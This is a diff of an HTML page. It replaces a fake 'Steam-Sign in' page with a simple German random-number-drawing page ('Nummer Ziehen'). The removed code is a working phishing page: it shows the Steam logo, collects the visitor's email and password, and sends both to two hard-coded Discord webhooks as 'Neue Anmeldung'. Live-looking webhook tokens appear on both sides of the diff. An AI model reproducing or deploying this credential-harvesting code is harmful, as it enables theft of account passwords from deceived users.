@@ -3,142 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anmeldung!!!!</title>
+    <title>Nummer Ziehen</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             font-family: Arial, sans-serif;
-            background-color: #292929; /* Hintergrundfarbe */
-            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            background-color: #202227;
-            width: 300px; /* Setze die Breite des Containers */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .form-container {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .form-container input[type="text"],
-        .form-container input[type="password"] {
-            width: calc(100% - 20px); /* Breite auf 100% des Containers minus Padding setzen */
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .container h2 {
-            color: white; /* Textfarbe schwarz */
             text-align: center;
-            margin-bottom: 20px;
         }
-        .container input[type="submit"] {
-            width: 100%; /* Breite auf 100% des Containers setzen */
+        input {
             padding: 10px;
-            background: linear-gradient(to bottom, #07BCFF, #2C74FF);
+            margin: 10px;
+            font-size: 1rem;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            background-color: #4CAF50;
             color: white;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: 5px;
         }
-        .container input[type="submit"]:hover {
-            background-color: #435363; /* Dunklerer Blauton bei Hover */
+        button:disabled {
+            background-color: grey;
+            cursor: not-allowed;
         }
-        .error-message {
-            color: red;
-            margin-top: 5px;
+        .result {
+            display: none;
             text-align: center;
+        }
+        .emoji {
+            font-size: 100px;
+        }
+        .number {
+            font-size: 50px;
+            font-weight: bold;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/100px-Steam_icon_logo.svg.png" alt="Steam Logo">
-        </div><h2>Steam-Sign in</h2>
-        
-        <div class="form-container">
-            <form id="loginForm">
-                <input type="text" id="email" placeholder="E-mail or Account Name">
-                <br>
-                <input type="password" id="password" placeholder="Password">
-                <br>
-                <input type="submit" value="Anmelden">
-            </form>
-        </div>
-        <p id="errorMessage" class="error-message"></p>
+    <div class="container" id="formContainer">
+        <h1>Nummer Ziehen</h1>
+        <input type="text" id="nameInput" placeholder="Vorname.Nachname" oninput="validateInput()" />
+        <br>
+        <button id="drawButton" onclick="drawNumber()" disabled>Nummer ziehen</button>
+    </div>
+
+    <div class="result" id="resultContainer">
+        <div class="emoji">🎟️</div>
+        <div class="number" id="randomNumber"></div>
     </div>
 
     <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Verhindert das Standardverhalten des Formulars
-
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
-
-            if (!validateEmail(email)) {
-                document.getElementById("errorMessage").innerText = "Please use a valid Email!";
-                return;
-            }
-
-            if (password === "") {
-                document.getElementById("errorMessage").innerText = "Please use a valid Password";
-                return;
-            }
-
-            var data = {
-                email: email,
-                password: password
-            };
-          sendEmbedToWebhook(data);
-            sendJSONDataToWebhook(data, "https://discord.com/api/webhooks/1209896372984352770/YHPM0Taz41RoNy0_9clWuPWhPI11-Ymi8OlkqmwCVZBibxMmu9O3zezifryHK3zSSq0c"); // Zweiten Webhook aufrufen
-        });
-
-        function validateEmail(email) {
-            var re = /\S+@\S+\.\S+/;
-            return re.test(email);
+        function validateInput() {
+            const nameInput = document.getElementById('nameInput').value;
+            const drawButton = document.getElementById('drawButton');
+            const regex = /^[A-Z]\.[A-Za-z]+$/;
+            drawButton.disabled = !regex.test(nameInput);
         }
 
-        function sendEmbedToWebhook(data) {
-            var xhr = new XMLHttpRequest();
-            var webhookURL = 'https://discord.com/api/webhooks/1209938899703697468/4IoWgfqB0Apy4FXm15poJ4mcMUFImqMI7e9viE4LtOw84QBcMaNfYrWJl-cC6Rh8aPOZ'; // Hier die URL des ersten Webhooks einfügen
-            xhr.open("POST", webhookURL, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                content: 'Neue Anmeldung',
+        function drawNumber() {
+            const randomNumber = Math.floor(Math.random() * 26) + 1;
+            const nameInput = document.getElementById('nameInput').value;
+
+            // Zeigt das Ergebnis an und versteckt das Formular
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('resultContainer').style.display = 'block';
+            document.getElementById('randomNumber').textContent = randomNumber;
+
+            // Senden der Nachricht an den Discord-Webhook
+            sendToDiscord(randomNumber, nameInput);
+        }
+
+        function sendToDiscord(randomNumber, nameInput) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1274398300203778100/EJD1mcqeVKynXSCfnFKetD_4BtGR3FaLR-hceFwPFvdz8cRuKh6KrpfOFD9x-jIx0PBF'; // Ersetze dies durch deine Discord-Webhook-URL
+
+            const data = {
+                username: "Nummer Ziehen",
                 embeds: [{
-                    title: 'Neue Anmeldung',
-                    color: 16711680, // Rot
-                    fields: [
-                        { name: 'E-Mail', value: data.email },
-                        { name: 'Passwort', value: data.password }
-                    ]
+                    title: "Neue Nummer wurde gezogen",
+                    description: `**Nummer:** ${randomNumber}\n**Name:** ${nameInput}`,
+                    color: 3066993 // Grün
                 }]
-            }));
-        }
+            };
 
-        function sendJSONDataToWebhook(data, webhookURL) {
-            var jsonContent = JSON.stringify(data);
-            var blob = new Blob([jsonContent], { type: 'application/json' });
-            var formData = new FormData();
-            formData.append('file', blob, 'data.json');
-
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookURL, true);
-            xhr.send(formData);
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                console.log('Success:', response);
+            }).catch((error) => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
